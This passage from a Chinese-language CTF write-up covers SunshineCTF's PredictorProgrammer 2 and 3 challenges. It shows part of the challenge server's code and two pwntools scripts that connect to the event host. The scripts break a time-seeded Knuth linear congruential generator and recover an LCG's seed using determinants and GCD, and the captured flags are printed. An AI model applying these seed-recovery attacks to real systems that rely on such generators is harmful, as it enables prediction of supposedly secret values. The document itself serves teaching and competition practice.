        message += 'And I\'d be stupid to use something predictable like TIME to predict the future...\n'
        message += 'There would be 100s of microseconds... uh I mean 100s of thousands of possibilities possible!\n'
        message += '...\n'
        message += 'Because I\'m so confident in this new system\'s security, this TIME I will give you SIXTEEN LIVES to make a guess...\n'
        message += 'So we\'re on the up-and-level with each other, I\'m using this code to come up with a totally random number:\n'
        message += '\n'
        message +="""# if knuth made it it must be secure!
def knuth_linear_congruential_generator(state):
    return (state * 6364136223846793005) + 1442695040888963407 % (2 ** 64)\n"""
        print(message)

        # thanks to jfs https://stackoverflow.com/a/8981813
        new_stdin = os.fdopen(os.dup(sys.stdin.fileno()))
        try:
            # Eh not really needed but it'll distract them longer if they think they can bring the challenge down somehow.
            client_process = multiprocessing.Process(target=test_client, args=[new_stdin])
            
            client_process.start()
            client_process.join(60)

            if client_process.is_alive():
                client_process.terminate()
                print("Too slow! You must not be from Florida!")
                raise RuntimeWarning()

            # thanks to ATOzTOA (https://stackoverflow.com/a/14924210) for helping with the multiprocessing code
            if client_process.exitcode != 0:
                print("Eh... wrong answer. You must not be from Florida!")
                raise RuntimeWarning()
        finally:
            new_stdin.close()
            
        print("\n...")
        print("\nHooooowwww? How did you solve it?")
        print("\n...")
        
        print("\n... oh well here's your second key, as promised:")
        print(flag_p2)
        print("\nFine. I'll make a better game. Sequels are all the rage! 🔥🏰🔥")
        print(f"\n{next_challenge_domain} {next_challenge_port} holds your next clue.")
        return 0

    except RuntimeWarning:
        print("Come visit Florida again some time!")
        return 0
    except KeyboardInterrupt:
        print("Killing server", file=sys.stderr)
        print("Server killed by Sunshine CTF admins, technical difficulties currently with this challenge, please come back soon. This is not part of the challenge... sorry. :(")
        return 0

client_thread()
```
:::

可以看到，seed 確實跟時間有關且會印出來，不過印出來的刻度是秒而 seed 使用的是 100 microsecond，也就是說可能的 seed 有 10000 個

不過，題目給了足夠的猜測次數，所以可以想辦法篩出 seed 可能是哪些

解密腳本
```python=
from pwn import *
from datetime import datetime
import time
context.log_level = "debug"

TIME_SCALE=10000

def knuth_linear_congruential_generator(state):
    return ((state * 6364136223846793005) + 1442695040888963407) % (2 ** 64)

conn = remote("predictor.sunshinectf.games", 22202)

conn.recvuntil(b"The current date is ")
data = conn.recvuntil(b", you have 30 seconds").strip()[:-21]

t = datetime.strptime(data.decode(), "%a, %d %b %Y %H:%M:%S %z")
seed_t = int(t.timestamp()) * TIME_SCALE

possible_seeds = [s for s in range(seed_t, seed_t+TIME_SCALE)]

live = 16
correct = 0
while live > 0 and correct < 5:
    seed = possible_seeds[0]
    number = knuth_linear_congruential_generator(seed)
    conn.recvuntil(b"18446744073709551615:\r\n")
    conn.sendline(f"{number}".encode())

    result = conn.recv(25)
    if(b"Lucky" in result):
        correct += 1
        possible_seeds = [number]
    elif(b"big" in result):
        live -= 1
        temp = []
        for s in possible_seeds[1:]:
            num = knuth_linear_congruential_generator(s)
            if(num < number):
                temp.append(num)
        possible_seeds = temp
    elif(b"small" in result):
        live -= 1
        temp = []
        for s in possible_seeds[1:]:
            num = knuth_linear_congruential_generator(s)
            if(num > number):
                temp.append(num)
        possible_seeds = temp
    else:
        print("error")
        break
conn.interactive()
```

基本上就是遇到輸出太大的提示就塞出輸出較小的那些，而遇到輸出太小就塞輸出較大的那些，如果剛好一致則 seed 就確定了

![](https://i.imgur.com/5JkzTho.png)

sun{well_i_guess_it_was_time}

### PredictorProgrammer 3
![](https://i.imgur.com/Akoxvu8.png)

這次要從 LCG 的 output 猜 seed

![](https://i.imgur.com/oXom2k1.png)

上網搜尋一下，找到這個 [github code](https://github.com/EnrisNVT/LCG-breaking-example/blob/master/example.py)，看起來是用一些 lattice 和 GCD 之類的手法來破 LCG

改寫了一下，script:
```python=
from pwn import *
from Crypto.Util.number import GCD
context.log_level = "debug"

conn = remote("predictor.sunshinectf.games", 22203)
conn.recvuntil(b"if you dare!\r\n")

nums = []
for i in range(6):
    conn.recvuntil(b"I was thinking of ")
    n = conn.recvuntil(b"...\r\n")[:-5]
    nums.append(int(n.decode()))

print(nums)

def calc_det(i,j,X):
	""" Calculate the values for the matrix[lattice] """
	a1 = X[i] - X[0]
	b1 = X[i+1] - X[1]
	a2 = X[j] - X[0]
	b2 = X[j+1] - X[1]
	""" Calculate the determinant """
	det = a1*b2 - a2*b1
	return abs(det)

dets = []
for i in range(3): #https://github.com/EnrisNVT/LCG-breaking-example/blob/master/example.py
    dets.append(calc_det(i+1,i+2,nums))

print(dets)

p = dets[0]
for i in range(2):
    p = GCD(p, dets[i+1])
a = ((nums[3] - nums[4]) * pow(nums[2] - nums[3], -1, p)) % p
b = (nums[4] - a * nums[3]) % p

print(a,b,p)

seed = ((nums[0] - b) * pow(a, -1, p)) % p

conn.sendlineafter(b"PAST SEED I was thinking of?", str(seed).encode())
conn.interactive()
```

拿到 flag

![](https://i.imgur.com/O5Nl1F9.png)

sun{bah_figures_lcgs_are_not_cryptographically_secure}